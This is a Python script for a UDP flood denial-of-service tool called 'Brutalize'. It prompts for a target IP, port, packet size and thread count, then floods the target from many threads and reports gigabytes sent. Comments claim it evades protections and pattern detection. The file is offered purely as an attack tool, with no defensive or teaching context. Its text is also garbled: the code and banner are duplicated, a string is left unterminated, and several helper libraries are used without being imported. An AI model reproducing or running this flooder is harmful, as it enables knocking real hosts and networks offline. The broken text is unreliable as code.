from socket import socket, AF_INET, SOCK_DGRAM, IPPROTO_UDP
import socket as sock
from threading import Thread, Lock
from random import choices, randint, random
from time import time, sleep
import ctypes
import struct

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.sent = 0
        self.total = 0
        self.on = True
        self.lock = Lock()

        # Create multiple sockets
        self.sockets = [self.create_socket() for _ in range(min(threads, 100))]

        # More varied payload patterns
        self.payloads = [
            str.encode("x" * self.force),
            str.encode("0" * self.force),
            str.encode("\x00" * self.force),
            str.encode("\xff" * self.force)
        ]

    def create_socket(self):
        try:
            s = sock.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
            s.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)

            # Enable socket options to bypass some basic protections
            try:
                s.setsockopt(sock.SOL_IP, sock.IP_HDRINCL, 1)
                s.setsockopt(sock.SOL_SOCKET, sock.SO_BROADCAST, 1)
            except:
                pass

            return s
        except:
            return None

    def flood(self):
        for socket in self.sockets:
            if socket:
                for _ in range(self.threads // len(self.sockets)):
                    Thread(target=self.send, args=(socket,)).start()
        Thread(target=self.info).start()

    def send(self, socket):
        while self.on:
            try:
                payload = choices(self.payloads)[0]
                addr = self._randaddr()

                # Randomize source port
                if random() > 0.5:
                    socket.bind(('0.0.0.0', randint(1024, 65535)))

                socket.sendto(payload, addr)

                with self.lock:
                    self.sent += len(payload)

                # Random delay to avoid easy pattern detection
                if random() > 0.9:
                    sleep(0.01 * random())

            except:
                # Recreate socket if there's an error
                new_socket = self.create_socket()
                if new_socket:
                    socket.close()
                    socket = new_socket
                else:
                    sleep(0.1)

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

    def info(self):
        interval = 0.05
        while self.on:
            with self.lock:
                bandwidth = self.sent / interval
                self.total += self.sent
                self.sent = 0

            print(f"\r{self.total / (1024*1024*1024):.2f} GB sent", end="")
            sleep(interval)

    def stop(self):
        self.on = False
        for socket in self.sockets:
            if socket:
                socket.close()

ascii = r'''
 █     █░ ▒█████   ██▓      █████▒
▓█░ █ ░█░▒██▒  ██▒▓██▒    ▓██   ▒
▒█░ █ ░█ ▒██░  ██▒▒██░    ▒████ ░
░█░ █ ░█ ▒██   ██░▒██░    ░▓█▒  ░
░░██▒██▓ ░ ████▓▒░░██████▒░▒█░
░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒ ░
  ▒ ░ ░    ░ ▒ ▒░ ░ ░ ▒  ░ ░
  ░   ░  ░ ░ ░ ▒    ░ ░    ░
    ░        ░ ░      ░  ░
'''

banner = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢸⠸⠀⡠⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⢠⣞⣀⡿⠀⠀⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡖⠁⠀⠀⠀⢸⠈⢈⡇⠀⢀⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠩⢠⡴⠀⠀⠀⠀⠀⠈⡶⠉⠀⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠎⢠⣇⠏⠀⠀⠀⠀⠀⠀⠀⠁⠀⢀⠄⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠏⠀⢸⣿⣴⠀⠀⠀⠀⠀⠀⣆⣀⢾⢟⠴⡇  Aizen⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡾⠀⢠⠀⣿⠃⠘⢹⣦⠀⠀⠀⢋⡟⠀⠀⠁⣇⠀⠀ON⠀⠀⠀
⠀⠀⠀⠀⢀⡾⠁⢠⠀⣿⠃⠘⢸⡟⠋⠀⠀⠀⠉⠀⠀⠀⠀⢸⡀⠀TOP⠀⠀
⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀

```python
from socket import socket, AF_INET, SOCK_DGRAM, IPPROTO_UDP
import socket as sock
from threading import Thread, Lock
from random import choices, randint, random
from time import time, sleep
import ctypes
import struct

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.sent = 0
        self.total = 0
        self.on = True
        self.lock = Lock()

        # Create multiple sockets
        self.sockets = [self.create_socket() for _ in range(min(threads, 100))]

        # More varied payload patterns
        self.payloads = [
            str.encode("x" * self.force),
            str.encode("0" * self.force),
            str.encode("\x00" * self.force),
            str.encode("\xff" * self.force)
        ]

    def create_socket(self):
        try:
            s = sock.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
            s.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)

            # Enable socket options to bypass some basic protections
            try:
                s.setsockopt(sock.SOL_IP, sock.IP_HDRINCL, 1)
                s.setsockopt(sock.SOL_SOCKET, sock.SO_BROADCAST, 1)
            except:
                pass

            return s
        except:
            return None

    def flood(self):
        for socket in self.sockets:
            if socket:
                for _ in range(self.threads // len(self.sockets)):
                    Thread(target=self.send, args=(socket,)).start()
        Thread(target=self.info).start()

    def send(self, socket):
        while self.on:
            try:
                payload = choices(self.payloads)[0]
                addr = self._randaddr()

                # Randomize source port
                if random() > 0.5:
                    socket.bind(('0.0.0.0', randint(1024, 65535)))

                socket.sendto(payload, addr)

                with self.lock:
                    self.sent += len(payload)

                # Random delay to avoid easy pattern detection
                if random() > 0.9:
                    sleep(0.01 * random())

            except:
                # Recreate socket if there's an error
                new_socket = self.create_socket()
                if new_socket:
                    socket.close()
                    socket = new_socket
                else:
                    sleep(0.1)

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

    def info(self):
        interval = 0.05
        while self.on:
            with self.lock:
                bandwidth = self.sent / interval
                self.total += self.sent
                self.sent = 0

            print(f"\r{self.total / (1024*1024*1024):.2f} GB sent", end="")
            sleep(interval)

    def stop(self):
        self.on = False
        for socket in self.sockets:
            if socket:
                socket.close()

ascii = r'''
 █     █░ ▒█████   ██▓      █████▒
▓█░ █ ░█░▒██▒  ██▒▓██▒    ▓██   ▒
▒█░ █ ░█ ▒██░  ██▒▒██░    ▒████ ░
░█░ █ ░█ ▒██   ██░▒██░    ░▓█▒  ░
░░██▒██▓ ░ ████▓▒░░██████▒░▒█░
░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒ ░
  ▒ ░ ░    ░ ▒ ▒░ ░ ░ ▒  ░ ░
  ░   ░  ░ ░ ░ ▒    ░ ░    ░
    ░        ░ ░      ░  ░
'''

banner = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢸⠸⠀⡠⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⢠⣞⣀⡿⠀⠀⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡖⠁⠀⠀⠀⢸⠈⢈⡇⠀⢀⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠩⢠⡴⠀⠀⠀⠀⠀⠈⡶⠉⠀⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠎⢠⣇⠏⠀⠀⠀⠀⠀⠀⠀⠁⠀⢀⠄⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠏⠀⢸⣿⣴⠀⠀⠀⠀⠀⠀⣆⣀⢾⢟⠴⡇  Aizen⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡾⠀⢠⠀⣿⠃⠘⢹⣦⠀⠀⠀⢋⡟⠀⠀⠁⣇⠀⠀ON⠀⠀⠀
⠀⠀⠀⠀⢀⡾⠁⢠⠀⣿⠃⠘⢸⡟⠋⠀⠀⠀⠉⠀⠀⠀⠀⢸⡀⠀TOP⠀⠀
⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀
⠐⠿⢿⣿⣤⣴⣿⣣⢾⡄⠀⠀⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀
⠀⠀⠀⣨⣟⡍⠉⠚⠹⣇⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⢀⡀⣾⡇⠀⠀
⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻⠀⠀
⠀⠀⠘⣰⣿⣿⡄⡆⠀⠀⠀⠳⣼⢦⡘⣄⠀⠀⡟⡷⠃⠘⢶⣿⡎⠻⣆⠀⠀
⠀⠀⠀⡟⡿⢿⡿⠀⠀⠀⠀⠀⠙⠀⠻⢯⢷⣼⠁⠁⠀⠀⠀⠙⢿⡄⡈⢆⠀
⠀⠀⠀⠀⡇⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⠀⠀⠀⠀⠀⠀⡇⢹⢿⡀
⠀⠀⠀⠀⠁⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠇⠁
   ⠁⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

# Define the orange color code
ORANGE = "\033[38;5;208m"
RESET = "\033[0m"

def hinput(prompt):
    return input(prompt)

def init():
    System.Size(140, 40)
    System.Title("Brute - by SPARKLEE")
    Cursor.HideCursor()

init()

def stage(text, symbol='...'):
    return f" {symbol} {ORANGE}{text}{RESET}"

def error(text, start='\n'):
    hinput(f"{start} {ORANGE}!{RESET} {ORANGE}{text}{RESET}")
    exit()

def main():
    print()
    print(Colorate.Diagonal(ORANGE, Center.XCenter(banner)))

    ip = input(stage(f"Enter the IP to Brutalize {ORANGE}->{RESET} ", '?'))
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.', ''))
    except:
        error("[Aizen]")

    port = input(stage(f"PORT [{ORANGE}press enter{RESET} to launch nukes all port] -> ", '?'))
    print()

    if port == '':
        port = None
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Error! Please enter a correct port.")

    force = input(stage(f"Evasion [{ORANGE}press enter{RESET} for 2000] -> ", '?'))
    print()

    if force == '':
        force = 2000
    else:
        try:
            force = int(force)
        except ValueError:
            error("Error! Please enter an integer.")

    threads = input(stage(f"Threads [{ORANGE}press enter{RESET} for 100] -> ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Error! Please enter an integer.")

    print()
    cport = '' if port is None else f"{ORANGE}:{RESET}{port}"
    print(stage(f"Attacking... {ORANGE}{ip}{cport}{RESET}."), end='\r')

    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("A fatal error has occurred and the attack was stopped.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"{ORANGE}Stopped. {RESET}{ip}{cport}{RESET} was Diddled With {ORANGE}{round(brute.total, 1)}{RESET} GB."))
    print('\n')
    sleep(1)

    hinput(stage(f"Press {ORANGE}enter{RESET} to {ORANGE}exit{RESET}.", '.'))

if __name__ == '__main__':
    main()